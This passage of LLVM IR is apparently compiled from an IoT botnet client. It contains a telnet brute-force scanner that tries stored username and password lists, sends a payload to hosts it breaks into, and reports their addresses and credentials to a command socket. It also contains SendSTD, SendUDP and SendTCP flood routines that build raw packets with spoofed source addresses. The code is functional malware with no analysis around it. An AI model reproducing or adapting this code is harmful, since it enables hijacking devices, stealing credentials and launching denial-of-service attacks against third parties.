  %191 = call i64 @time(i64* null) #7
  %192 = icmp slt i64 %190, %191
  br i1 %192, label %193, label %356

; <label>:193:                                    ; preds = %187
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:194:                                    ; preds = %53
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 5
  %198 = load i8, i8* %197, align 1
  %199 = zext i8 %198 to i64
  %200 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %199
  %201 = load i8*, i8** %200, align 8
  %202 = call i64 @strlen(i8* %201) #14
  %203 = call i64 @send(i32 %196, i8* %201, i64 %202, i32 16384) #7
  %204 = icmp slt i64 %203, 0
  br i1 %204, label %205, label %206

; <label>:205:                                    ; preds = %194
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:206:                                    ; preds = %194
  %207 = load i32, i32* %195, align 16
  %208 = call i64 @send(i32 %207, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.115, i64 0, i64 0), i64 2, i32 16384) #7
  %209 = icmp slt i64 %208, 0
  br i1 %209, label %210, label %211

; <label>:210:                                    ; preds = %206
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:211:                                    ; preds = %206
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 6)
  br label %356

; <label>:212:                                    ; preds = %53
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %214 = load i32, i32* %213, align 16
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 9
  %216 = load i8*, i8** %215, align 8
  %217 = call i32 @read_until_response(i32 %214, i32 %0, i8* %216, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %218 = icmp eq i32 %217, 0
  br i1 %218, label %250, label %219

; <label>:219:                                    ; preds = %212
  %220 = call i64 @time(i64* null) #7
  %221 = trunc i64 %220 to i32
  store i32 %221, i32* %47, align 16
  %222 = load i8*, i8** %215, align 8
  %223 = call i32 @contains_fail(i8* %222)
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %226, label %225

; <label>:225:                                    ; preds = %219
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 0)
  br label %356

; <label>:226:                                    ; preds = %219
  %227 = load i8*, i8** %215, align 8
  %228 = call i32 @contains_success(i8* %227)
  %229 = icmp eq i32 %228, 0
  br i1 %229, label %249, label %230

; <label>:230:                                    ; preds = %226
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 3
  %232 = load i8, i8* %231, align 1
  %233 = icmp eq i8 %232, 2
  br i1 %233, label %234, label %235

; <label>:234:                                    ; preds = %230
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 7)
  br label %356

; <label>:235:                                    ; preds = %230
  %236 = load i32, i32* @mainCommSock, align 4
  %237 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 4
  %239 = load i8, i8* %238, align 2
  %240 = zext i8 %239 to i64
  %241 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %240
  %242 = load i8*, i8** %241, align 8
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 5
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i64
  %246 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %245
  %247 = load i8*, i8** %246, align 8
  %248 = call i32 (i32, i8*, ...) @sockprintf(i32 %236, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i64 0, i64 0), i8* %237, i8* %242, i8* %247)
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 7)
  br label %356

; <label>:249:                                    ; preds = %226
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:250:                                    ; preds = %212
  %251 = load i32, i32* %47, align 16
  %252 = add i32 %251, 7
  %253 = zext i32 %252 to i64
  %254 = call i64 @time(i64* null) #7
  %255 = icmp slt i64 %253, %254
  br i1 %255, label %256, label %356

; <label>:256:                                    ; preds = %250
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:257:                                    ; preds = %53
  %258 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %44, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.117, i64 0, i64 0), i8** getelementptr inbounds ([10 x i8*], [10 x i8*]* @tempdirs, i64 0, i64 0)) #7
  %259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %260 = load i32, i32* %259, align 16
  %261 = call i64 @strlen(i8* nonnull %44) #14
  %262 = call i64 @send(i32 %260, i8* nonnull %44, i64 %261, i32 16384) #7
  %263 = icmp slt i64 %262, 0
  br i1 %263, label %264, label %265

; <label>:264:                                    ; preds = %257
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:265:                                    ; preds = %257
  %266 = call i32 (...) @RemoveTempDirs() #7
  %267 = load i32, i32* @mainCommSock, align 4
  %268 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 4
  %270 = load i8, i8* %269, align 2
  %271 = zext i8 %270 to i64
  %272 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %271
  %273 = load i8*, i8** %272, align 8
  %274 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 5
  %275 = load i8, i8* %274, align 1
  %276 = zext i8 %275 to i64
  %277 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %276
  %278 = load i8*, i8** %277, align 8
  %279 = call i32 (i32, i8*, ...) @sockprintf(i32 %267, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.118, i64 0, i64 0), i8* %268, i8* %273, i8* %278)
  call void @advance_telstate(%struct.telstate_t* nonnull %46, i32 8)
  br label %356

; <label>:280:                                    ; preds = %53
  %281 = call i64 @time(i64* null) #7
  %282 = trunc i64 %281 to i32
  store i32 %282, i32* %47, align 16
  %283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 0, i32 0
  %284 = load i32, i32* %283, align 16
  %285 = call i64 @send(i32 %284, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.119, i64 0, i64 0), i64 4, i32 16384) #7
  %286 = load i32, i32* %283, align 16
  %287 = call i64 @send(i32 %286, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.120, i64 0, i64 0), i64 7, i32 16384) #7
  %288 = load i32, i32* %283, align 16
  %289 = load i8*, i8** @payload, align 8
  %290 = call i64 @strlen(i8* %289) #14
  %291 = call i64 @send(i32 %288, i8* %289, i64 %290, i32 16384) #7
  %292 = icmp slt i64 %291, 0
  br i1 %292, label %293, label %294

; <label>:293:                                    ; preds = %280
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:294:                                    ; preds = %280
  %295 = load i32, i32* @mainCommSock, align 4
  %296 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 4
  %298 = load i8, i8* %297, align 2
  %299 = zext i8 %298 to i64
  %300 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %299
  %301 = load i8*, i8** %300, align 8
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 5
  %303 = load i8, i8* %302, align 1
  %304 = zext i8 %303 to i64
  %305 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %304
  %306 = load i8*, i8** %305, align 8
  %307 = call i32 (i32, i8*, ...) @sockprintf(i32 %295, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.121, i64 0, i64 0), i8* %296, i8* %301, i8* %306)
  %308 = load i32, i32* %283, align 16
  %309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 9
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @read_until_response(i32 %308, i32 %0, i8* %310, i32 1024, i8** bitcast ([10 x i8]* @.str.122 to i8**))
  %312 = icmp eq i32 %311, 0
  br i1 %312, label %333, label %313

; <label>:313:                                    ; preds = %294
  %314 = load i8*, i8** %309, align 8
  %315 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %314, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.123, i64 0, i64 0)) #7
  %316 = icmp eq i32 %315, 0
  br i1 %316, label %333, label %317

; <label>:317:                                    ; preds = %313
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 3
  %319 = load i8, i8* %318, align 1
  %320 = icmp eq i8 %319, 3
  br i1 %320, label %333, label %321

; <label>:321:                                    ; preds = %317
  %322 = load i32, i32* @mainCommSock, align 4
  %323 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %324 = load i8, i8* %297, align 2
  %325 = zext i8 %324 to i64
  %326 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %325
  %327 = load i8*, i8** %326, align 8
  %328 = load i8, i8* %302, align 1
  %329 = zext i8 %328 to i64
  %330 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %329
  %331 = load i8*, i8** %330, align 8
  %332 = call i32 (i32, i8*, ...) @sockprintf(i32 %322, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.124, i64 0, i64 0), i8* %323, i8* %327, i8* %331)
  br label %333

; <label>:333:                                    ; preds = %317, %313, %294, %321
  %334 = load i32, i32* %47, align 16
  %335 = add i32 %334, 45
  %336 = zext i32 %335 to i64
  %337 = call i64 @time(i64* null) #7
  %338 = icmp slt i64 %336, %337
  br i1 %338, label %339, label %356

; <label>:339:                                    ; preds = %333
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i64 %45, i32 3
  %341 = load i8, i8* %340, align 1
  %342 = icmp eq i8 %341, 3
  br i1 %342, label %355, label %343

; <label>:343:                                    ; preds = %339
  %344 = load i32, i32* @mainCommSock, align 4
  %345 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %46)
  %346 = load i8, i8* %297, align 2
  %347 = zext i8 %346 to i64
  %348 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_usernames, i64 0, i64 %347
  %349 = load i8*, i8** %348, align 8
  %350 = load i8, i8* %302, align 1
  %351 = zext i8 %350 to i64
  %352 = getelementptr inbounds [6 x i8*], [6 x i8*]* @tel_passwords, i64 0, i64 %351
  %353 = load i8*, i8** %352, align 8
  %354 = call i32 (i32, i8*, ...) @sockprintf(i32 %344, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.125, i64 0, i64 0), i8* %345, i8* %349, i8* %353)
  br label %355

; <label>:355:                                    ; preds = %339, %343
  call void @reset_telstate(%struct.telstate_t* nonnull %46)
  br label %356

; <label>:356:                                    ; preds = %53, %171, %211, %265, %96, %95, %131, %125, %153, %147, %193, %187, %256, %250, %355, %333, %225, %234, %235, %249, %185, %186, %145, %146, %118, %119, %78, %293, %264, %210, %205, %170, %165, %124, %77
  %357 = add nsw i32 %.1120, 1
  %358 = icmp slt i32 %357, %.
  %.mux = select i1 %358, i32 %357, i32 0
  br label %.lr.ph
}

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

declare i32 @RemoveTempDirs(...) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define void @SendSTD(i8*, i32, i32) local_unnamed_addr #11 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #7
  %6 = tail call i64 @time(i64* null) #7
  %7 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %8 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %8, i8 0, i64 16, i32 4, i1 false)
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #7
  %17 = getelementptr inbounds %struct.hostent, %struct.hostent* %7, i64 0, i32 2
  %18 = load i32, i32* %17, align 8
  %19 = trunc i32 %18 to i16
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %19, i16* %20, align 4
  %21 = trunc i32 %1 to i16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %24 = sext i32 %2 to i64
  %25 = add nsw i64 %6, %24
  br label %26

; <label>:26:                                     ; preds = %40, %3
  %.0 = phi i32 [ 0, %3 ], [ %41, %40 ]
  %27 = call i32 @rand() #7
  %28 = icmp ugt i32 %.0, 49
  br i1 %28, label %29, label %40

; <label>:29:                                     ; preds = %26
  %30 = sext i32 %27 to i64
  %31 = urem i64 %30, 26
  %32 = getelementptr inbounds [26 x i8*], [26 x i8*]* @SendSTD.randstrings, i64 0, i64 %31
  %33 = load i8*, i8** %32, align 8
  %34 = call i64 @send(i32 %5, i8* %33, i64 75, i32 0) #7
  %35 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %23, i32 16) #7
  %36 = call i64 @time(i64* null) #7
  %37 = icmp slt i64 %36, %25
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %29
  %39 = call i32 @close(i32 %5) #7
  call void @_exit(i32 0) #16
  unreachable

; <label>:40:                                     ; preds = %29, %26
  %.1 = phi i32 [ %.0, %26 ], [ 0, %29 ]
  %41 = add i32 %.1, 1
  br label %26
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #12

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #2 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #15
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %127

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %127, label %27

; <label>:27:                                     ; preds = %22
  store i32 1, i32* %8, align 4
  %28 = bitcast i32* %8 to i8*
  %29 = call i32 @setsockopt(i32 %25, i32 0, i32 3, i8* nonnull %28, i32 4) #7
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %127, label %.preheader.preheader

.preheader.preheader:                             ; preds = %27
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.04041 = phi i32 [ %31, %.preheader ], [ 50, %.preheader.preheader ]
  %31 = add nsw i32 %.04041, -1
  %32 = call i64 @time(i64* null) #7
  %33 = call i32 @rand_cmwc()
  %34 = zext i32 %33 to i64
  %35 = xor i64 %34, %32
  %36 = trunc i64 %35 to i32
  call void @srand(i32 %36) #7
  %37 = call i32 @rand() #7
  call void @init_rand(i32 %37)
  %38 = icmp eq i32 %31, 0
  br i1 %38, label %39, label %.preheader

; <label>:39:                                     ; preds = %.preheader
  %40 = sub nsw i32 32, %5
  %41 = shl i32 -1, %40
  %42 = sext i32 %3 to i64
  %43 = add nsw i64 %42, 28
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %49 = load i32, i32* %48, align 4
  %50 = call i32 @getRandomIP(i32 %41)
  %51 = call i32 @htonl(i32 %50) #15
  %52 = add nsw i64 %42, 8
  %53 = trunc i64 %52 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %49, i32 %51, i8 zeroext 17, i32 %53)
  %54 = trunc i64 %52 to i16
  %55 = call zeroext i16 @htons(i16 zeroext %54) #15
  %56 = getelementptr inbounds i8, i8* %45, i64 24
  %57 = bitcast i8* %56 to i16*
  store i16 %55, i16* %57, align 8
  %58 = call i32 @rand_cmwc()
  %59 = trunc i32 %58 to i16
  %60 = bitcast i8* %47 to i16*
  store i16 %59, i16* %60, align 4
  br i1 %10, label %61, label %63

; <label>:61:                                     ; preds = %39
  %62 = call i32 @rand_cmwc()
  br label %67

; <label>:63:                                     ; preds = %39
  %64 = trunc i32 %1 to i16
  %65 = call zeroext i16 @htons(i16 zeroext %64) #15
  %66 = zext i16 %65 to i32
  br label %67

; <label>:67:                                     ; preds = %63, %61
  %.pre-phi = phi i16 [ %64, %63 ], [ 0, %61 ]
  %68 = phi i32 [ %66, %63 ], [ %62, %61 ]
  %69 = trunc i32 %68 to i16
  %70 = getelementptr inbounds i8, i8* %45, i64 22
  %71 = bitcast i8* %70 to i16*
  store i16 %69, i16* %71, align 2
  %72 = getelementptr inbounds i8, i8* %45, i64 26
  %73 = bitcast i8* %72 to i16*
  store i16 0, i16* %73, align 2
  %74 = getelementptr inbounds i8, i8* %45, i64 28
  call void @makeRandomStr(i8* %74, i32 %3)
  %75 = bitcast i8* %45 to i16*
  %76 = getelementptr inbounds i8, i8* %45, i64 2
  %77 = bitcast i8* %76 to i16*
  %78 = load i16, i16* %77, align 2
  %79 = zext i16 %78 to i32
  %80 = call zeroext i16 @csum(i16* nonnull %75, i32 %79)
  %81 = getelementptr inbounds i8, i8* %45, i64 10
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 2
  %83 = call i64 @time(i64* null) #7
  %84 = zext i32 %2 to i64
  %85 = add i64 %83, %84
  %86 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %87 = getelementptr inbounds i8, i8* %45, i64 4
  %88 = bitcast i8* %87 to i16*
  %89 = getelementptr inbounds i8, i8* %45, i64 12
  %90 = bitcast i8* %89 to i32*
  %sext = shl i64 %85, 32
  %91 = ashr exact i64 %sext, 32
  br i1 %10, label %.split.us.preheader, label %.split.preheader

.split.preheader:                                 ; preds = %67
  br label %.split

.split.us.preheader:                              ; preds = %67
  br label %.split.us

.split.us:                                        ; preds = %.split.us.backedge, %.split.us.preheader
  %.0.us = phi i32 [ 0, %.split.us.preheader ], [ %.0.us.be, %.split.us.backedge ]
  %92 = call i64 @sendto(i32 %25, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %86, i32 16) #7
  %93 = call i32 @rand_cmwc()
  %94 = trunc i32 %93 to i16
  store i16 %94, i16* %60, align 4
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  store i16 %96, i16* %71, align 2
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  store i16 %98, i16* %88, align 4
  %99 = call i32 @getRandomIP(i32 %41)
  %100 = call i32 @htonl(i32 %99) #15
  store i32 %100, i32* %90, align 4
  %101 = load i16, i16* %77, align 2
  %102 = zext i16 %101 to i32
  %103 = call zeroext i16 @csum(i16* nonnull %75, i32 %102)
  store i16 %103, i16* %82, align 2
  %104 = icmp eq i32 %.0.us, %4
  br i1 %104, label %107, label %105

; <label>:105:                                    ; preds = %.split.us
  %106 = add i32 %.0.us, 1
  br label %.split.us.backedge

; <label>:107:                                    ; preds = %.split.us
  %108 = call i64 @time(i64* null) #7
  %109 = icmp sgt i64 %108, %91
  br i1 %109, label %.us-lcssa.us.loopexit, label %.split.us.backedge

.split.us.backedge:                               ; preds = %107, %105
  %.0.us.be = phi i32 [ %106, %105 ], [ 0, %107 ]
  br label %.split.us

.split:                                           ; preds = %.split.backedge, %.split.preheader
  %.0 = phi i32 [ 0, %.split.preheader ], [ %.0.be, %.split.backedge ]
  %110 = call i64 @sendto(i32 %25, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %86, i32 16) #7
  %111 = call i32 @rand_cmwc()
  %112 = trunc i32 %111 to i16
  store i16 %112, i16* %60, align 4
  %113 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #15
  store i16 %113, i16* %71, align 2
  %114 = call i32 @rand_cmwc()
  %115 = trunc i32 %114 to i16
  store i16 %115, i16* %88, align 4
  %116 = call i32 @getRandomIP(i32 %41)
  %117 = call i32 @htonl(i32 %116) #15
  store i32 %117, i32* %90, align 4
  %118 = load i16, i16* %77, align 2
  %119 = zext i16 %118 to i32
  %120 = call zeroext i16 @csum(i16* nonnull %75, i32 %119)
  store i16 %120, i16* %82, align 2
  %121 = icmp eq i32 %.0, %4
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %.split
  %123 = call i64 @time(i64* null) #7
  %124 = icmp sgt i64 %123, %91
  br i1 %124, label %.us-lcssa.us.loopexit45, label %.split.backedge

; <label>:125:                                    ; preds = %.split
  %126 = add i32 %.0, 1
  br label %.split.backedge

.split.backedge:                                  ; preds = %125, %122
  %.0.be = phi i32 [ %126, %125 ], [ 0, %122 ]
  br label %.split

.us-lcssa.us.loopexit:                            ; preds = %107
  br label %.us-lcssa.us

.us-lcssa.us.loopexit45:                          ; preds = %122
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit45, %.us-lcssa.us.loopexit
  call void @llvm.stackrestore(i8* %44)
  br label %127

; <label>:127:                                    ; preds = %22, %17, %27, %.us-lcssa.us
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #7

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) local_unnamed_addr #2 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #15
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %160

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %160, label %28

; <label>:28:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = bitcast i32* %9 to i8*
  %30 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %29, i32 4) #7
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %160, label %32

; <label>:32:                                     ; preds = %28
  %33 = icmp eq i32 %6, 0
  %34 = sub nsw i32 32, %6
  %35 = shl i32 -1, %34
  %.083 = select i1 %33, i32 0, i32 %35
  %36 = sext i32 %4 to i64
  %37 = add nsw i64 %36, 40
  %38 = call i8* @llvm.stacksave()
  %39 = alloca i8, i64 %37, align 16
  %40 = bitcast i8* %39 to %struct.iphdr*
  %41 = getelementptr i8, i8* %39, i64 20
  %42 = bitcast i8* %41 to %struct.tcphdr*
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @getRandomIP(i32 %.083)
  %46 = call i32 @htonl(i32 %45) #15
  %47 = add i32 %4, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %40, i32 %44, i32 %46, i8 zeroext 6, i32 %47)
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = bitcast i8* %41 to i16*
  store i16 %49, i16* %50, align 4
  %51 = call i32 @rand_cmwc()
  %52 = getelementptr inbounds i8, i8* %39, i64 24
  %53 = bitcast i8* %52 to i32*
  store i32 %51, i32* %53, align 8
  %54 = getelementptr inbounds i8, i8* %39, i64 28
  %55 = bitcast i8* %54 to i32*
  store i32 0, i32* %55, align 4
  %56 = getelementptr inbounds i8, i8* %39, i64 32
  %57 = bitcast i8* %56 to i16*
  %58 = load i16, i16* %57, align 16
  %59 = and i16 %58, -241
  %60 = or i16 %59, 80
  store i16 %60, i16* %57, align 16
  %61 = call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.152, i64 0, i64 0)) #14
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %32
  %64 = and i16 %58, -16369
  %65 = or i16 %64, 16208
  store i16 %65, i16* %57, align 16
  br label %66

; <label>:66:                                     ; preds = %32, %63
  %67 = phi i16 [ %60, %32 ], [ %65, %63 ]
  %68 = call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.153, i64 0, i64 0)) #14
  %69 = icmp eq i32 %68, 0
  br i1 %69, label %70, label %72

; <label>:70:                                     ; preds = %66
  %71 = or i16 %67, 8704
  store i16 %71, i16* %57, align 16
  br label %72

; <label>:72:                                     ; preds = %66, %70
  %73 = phi i16 [ %67, %66 ], [ %71, %70 ]
  %74 = call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.154, i64 0, i64 0)) #14
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %78

; <label>:76:                                     ; preds = %72
  %77 = or i16 %73, 4608
  store i16 %77, i16* %57, align 16
  br label %.loopexit

; <label>:78:                                     ; preds = %72
  %79 = call i8* @strtok(i8* %3, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i64 0, i64 0)) #7
  %80 = icmp eq i8* %79, null
  br i1 %80, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %78
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %101
  %.08485 = phi i8* [ %102, %101 ], [ %79, %.lr.ph.preheader ]
  %81 = call i32 @strcmp(i8* nonnull %.08485, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %.sink.split, label %83

; <label>:83:                                     ; preds = %.lr.ph
  %84 = call i32 @strcmp(i8* nonnull %.08485, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.157, i64 0, i64 0)) #14
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %.sink.split, label %86

; <label>:86:                                     ; preds = %83
